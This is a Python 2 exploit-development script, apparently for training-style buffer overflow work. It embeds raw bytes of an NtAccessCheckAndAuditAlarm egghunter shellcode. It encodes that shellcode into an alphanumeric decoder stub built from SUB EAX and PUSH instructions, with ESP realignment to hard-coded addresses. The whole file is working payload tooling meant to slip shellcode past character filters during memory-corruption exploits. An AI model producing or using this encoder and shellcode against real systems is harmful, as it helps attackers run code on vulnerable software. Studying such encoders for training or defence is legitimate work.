#!/usr/bin/env python
# Code for sub3 function adapted from https://vulners.com/metasploit/MSF:ENCODER/X86/OPT_SUB

# sc variable should contain the target decoded shellcode
# esp_current variable should contain the value of ESP at the first instruction of the generated decoder shellcode
# esp_target variable should contain the address where the target shellcode will be decoded
# esp_target should be separated from the decoder shellcode by a sled of inoffensive instructions
# if esp_current and esp_target are not provided, ESP must already point to the address where the shellcode will be decoded
# goodchar should be a string containing valid characters to be used by the decoder
# It requires minimum 16 bytes per 4 bytes of shellcode to be decoded + 19 bytes for ESP alignment
# If EAX needs to be zeroized, this will generate an additional 12 bytes the 1st time and 2 bytes for each subsequent need

# Original shellcode
egg = "knar"
sc_desc = "# NtAccessCheckAndAuditAlarm Shellcode Egghunter\n# Egg: %s" %egg
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + egg + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
subesp = "\x81\xEC\x00\x10\x00\x00\x41\x41" # SUB ESP, 0x1000 # May be required if payload crashes (the decoded shellcode might be overwriting itself)
sc = subesp + egghunter


# ESP Alignment values
esp_current = 0x1034E1E8
esp_target  = 0x1035FF70


# Valid Charset definition
SET_ALPHAU   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # 0x41 --> 0x5A
SET_ALPHAL   = "abcdefghijklmnopqrstuvwxyz" # 0x61 --> 0x7A
SET_NUM      = "0123456789"                 # 0x30 --> 0x39
SET_CUST     = ""
SET_SYM      = "!@#$%^&*()_+\\-=[]{};'\":<>,.?/|~"
SET_FILESYM  = '()_+-=\\/.,[]{}@!$%^&='
SET_0        = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
SET_1        = "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
SET_2        = "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e"
SET_3        = "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e"
SET_4        = "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
SET_5        = "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
SET_6        = "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
SET_7        = "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
MAND_OPCODES = "\x25\x50\x52\x54\x58\x5A\x5C\x2D"

goodchar = SET_ALPHAL + SET_ALPHAU + SET_NUM + MAND_OPCODES + "\x23"



# ------------------------------------------------------------
#              NO USER-SERVICEABLE VAR BELOW THIS
# ------------------------------------------------------------

import binascii
import struct
import sys


CRED = "\033[91m"; CGRE = "\033[92m"; CYEL = "\033[93m"; CBLU = "\033[94m"; CPUR = "\033[95m"; CCYA = "\033[96m"; CWHI = "\033[97m"; CRST = "\033[0m"; BRED= "\033[41m"


valid_bytes = set()

for c in goodchar:
    valid_bytes.add(ord(c))
valid_bytes = list(valid_bytes)
list = ""

for i in valid_bytes:
    list += "0x%02x " %i
    if i in range(0x20, 0x7f):
        list += "(%s) " % chr(i)

required_opcodes = {
    "AND_EAX"  : "\x25",
    "PUSH_EAX" : "\x50",
    "PUSH_EDX" : "\x52",
    "PUSH_ESP" : "\x54",
    "POP_EAX"  : "\x58",
    "POP_EDX"  : "\x5A",
    "POP_ESP"  : "\x5C",
    "SUB_EAX"  : "\x2D",
}

missing_opcodes = []
for opcode in required_opcodes:
    if ord(required_opcodes[opcode]) not in valid_bytes:
        halt = True
        missing_opcodes.append("0x%02x: %s" % (ord(required_opcodes[opcode]), opcode))

if missing_opcodes :
    print("%sMissing the following opcodes in the valid charset to build shellcode :%s" % (CRED, CRST))
    for opcode in missing_opcodes:
        print(opcode)
    print("\n"*3)
    sys.exit()


def pad(str, int, chr):
    while len(str) % int:
        str += chr
    return str


def split_word(hexstr):
    n = 8
    return [(int(hexstr[i:i+n], 16)) for i in range(0, len(hexstr), n)]


def sub3(chunk, previous=0):
    carry  = 0
    shift  = 0
    if type(chunk) == str:
        chunk = int(chunk, 16)
    if type(previous) == str:
        previous = int(previous, 16)
    target = previous - chunk
    sumc   = [0, 0, 0]
    
    for i in range(0, 4):
        b =  target >> shift & 0xFF
        lo = md = hi = 0
        
        # keep going through the character list under the "lowest" valid
        # becomes too high (ie. we run out)
        while lo < len(valid_bytes):
            # get the total of the three current bytes, including the carry from
            # the previous calculation
            total = valid_bytes[lo] + valid_bytes[md] + valid_bytes[hi] + carry
            
            # if we matched a byte..
            if (total & 0xFF) == b:
                # store the carry for the next calculation
                carry = (total >> 8) & 0xFF
                # store the values in the respective locations
                sumc[2] |= valid_bytes[lo] << shift
                sumc[1] |= valid_bytes[md] << shift
                sumc[0] |= valid_bytes[hi] << shift
                break
            
            hi +=1
            
            if hi >= len(valid_bytes):
                md += 1
                hi = md
                
            if md >= len(valid_bytes):
              lo += 1
              hi = md = lo
            # we ran out of chars to try
            if lo >= len(valid_bytes):
                return None, None, None

        shift += 8
    
    comp = hex(sum(sumc))
    
    for i in range (3):
        sumc[i] = hex(sumc[i])

    return sumc, comp, chunk


def find_opposite_bytes(list):
    for b1 in list:
        for b2 in list:
            if b1 & b2 == 0:
                return b1, b2
    return None, None


def zeroize_eax(sc_enc, sc_enc_verb, eaxz):
    eax1, eax2 = find_opposite_bytes(valid_bytes)
    if eaxz == 0:
        sc_enc      += "%s%s%s%s%s" % (chr(0x25), chr(eax1), chr(eax1), chr(eax1), chr(eax1))
        sc_enc      += "%s%s%s%s%s" % (chr(0x25),chr(eax2), chr(eax2), chr(eax2), chr(eax2))
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax1, eax1, eax1, eax1, eax1, eax1, eax1, eax1)
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax2, eax2, eax2, eax2, eax2, eax2, eax2, eax2)
        sc_enc      += "\x50"
        sc_enc      += "\x5A"
        sc_enc_verb += "\"\\x50\"                    # PUSH EAX\n"
        sc_enc_verb += "\"\\x5A\"                    # POP EDX\n\n"
        eaxz = 1
    else:
        sc_enc      += "\x52"
        sc_enc      += "\x58"
        sc_enc_verb += "\"\\x52\"                    # PUSH 0x%08x (EDX)\n" % 0
        sc_enc_verb += "\"\\x58\"                    # POP EAX\n\n"
    return sc_enc, sc_enc_verb, eaxz


def encodesc(sc, esp_cur=None, esp_tgt=None):
    eaxz = 0
    sc_enc = ""
    sc_enc_verb = "# " + "-"*60
    previous = 0
    
    # Step 1: Reverse shellcode (setup correct endianness for decoding)
    sc = sc[::-1]
    
    # Step 2: Pad shellcode to DWORDS
    sc = pad(sc, 4, "\x90")
    sc_hex =  binascii.hexlify(sc)
    
    # Step 3: Split shellcode into DWORDS
    sc_words = split_word(sc_hex)
    sc_sums = []
    sc_comp = []
    
    sc_enc_verb += "\n"
    sc_enc_verb += sc_desc
    sc_enc_verb += "\n# length: LENPLACEHOLDER bytes\n\n"
    sc_enc_verb += "shellcode_decoder = (\n"
    
    # Step 4: Compute ESP alignment shellcode
    if esp_cur and esp_tgt:
        sc_enc_verb += "# Perform ESP offset alignment towards desired target\n"
        sc_enc_verb += "# ESP=0x%08x, Target=0x%08x\n" % (esp_cur, esp_tgt)
        
        sc_enc      += "\x54"
        sc_enc      += "\x58"
        sc_enc_verb += "\"\\x54\"                    # PUSH ESP\n"
        sc_enc_verb += "\"\\x58\"                    # POP EAX\n"
        
        offsets, a, previous = sub3(esp_tgt, esp_cur)
        if offsets == None:
            raise Exception('no solution with available charset')
        for val in offsets:
            sc_enc      += "\x2D"
            sc_enc_verb += "\"\\x2D"
            for c in struct.pack('<I', int(val, 16)):
                sc_enc      +=      "%s" % c
                sc_enc_verb += "\\x%02x" % ord(c)
            sc_enc_verb += "\"    # SUB EAX, 0x%08x\n" % int(val, 16)
        sc_enc      += "\x50"
        sc_enc      += "\x5C"
        sc_enc_verb += "\"\\x50\"                    # PUSH 0x%x (EAX)\n" % esp_target
        sc_enc_verb += "\"\\x5C\"                    # POP ESP\n"
        sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP (0x%x)\n\n" %esp_target
    else:
        sc_enc_verb += "# /!\ WARNING: No value provided for EIP current/target /!\ \n"
        sc_enc_verb += "# /!\ ESP must already point to the address where the shellcode will be decoded /!\ \n"
        sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP\n\n"
    
    # Step 5: Compute the sum terms for each DWORD; each computation will take the previous result as starting point
    for i in range(len(sc_words)):
        if i != 0: sc_enc_verb += "\n"
        if previous == 0:
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "\n"
        
        # Compute each DWORD 2's complement and sub components
        sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
        sumci, compi, previous = sub3(sc_words[i], previous)
        # If the computation failed, try again starting with EAX = 0
        if sumci == None:
            previous = 0
            sc_enc_verb += " %sNOK%s - Zeroizing EAX\n" % (CRED, CRST)
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
            sumci, compi, previous = sub3(sc_words[i], previous)
            # If it failed again, abort
            if sumci == None:
                sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
                sc_enc_verb += " No solution found with the availabel charset"
                raise Exception("%sno solution with available charset%s" % (CRED, CRST))
            else:
                sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)
        else:
            sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)
        # Add the results in their respective arrays
        sc_sums.append(sumci)
        sc_comp.append(compi)
        
        # Produce the SUB instructions
        for val in sc_sums[-1]:
            sc_enc      += "\x2D"
            sc_enc_verb += "\"\\x2D"
            for c in struct.pack('<I', int(val, 16)):
                sc_enc      +=      "%s" % c
                sc_enc_verb += "\\x%02x" % ord(c)
            sc_enc_verb += "\"    # SUB EAX, 0x%08x\n" % int(val, 16)
        sc_enc      += "\x50"
        sc_enc_verb += "\"\\x50\"                    # PUSH 0x%08x (EAX)\n" % sc_words[i]
    sc_enc_verb += ")\n# " + "-"*60 + "\n\n"

    sc_enc_verb = sc_enc_verb.replace("LENPLACEHOLDER",str(len(sc_enc)))

    return sc_enc, sc_enc_verb

sc_encoded, sc_encoded_verb = encodesc(sc, esp_current, esp_target)

print("Valid charset: %s\n\n\n" % list)
print("" + sc_encoded_verb)
print("Original shellcode length: %i" %len(sc))
print("Encoded  Shellcode length: %i" % len(sc_encoded))

sc_raw=""
for c in sc:
    sc_raw += "\\x%02x" % ord(c)
print("\noriginal_shellcode = \"%s\"") % sc_raw

sc_raw=""
for c in sc_encoded:
    sc_raw += "\\x%02x" % ord(c)
print("\nshellcode_decoder = \"%s\"") % sc_raw
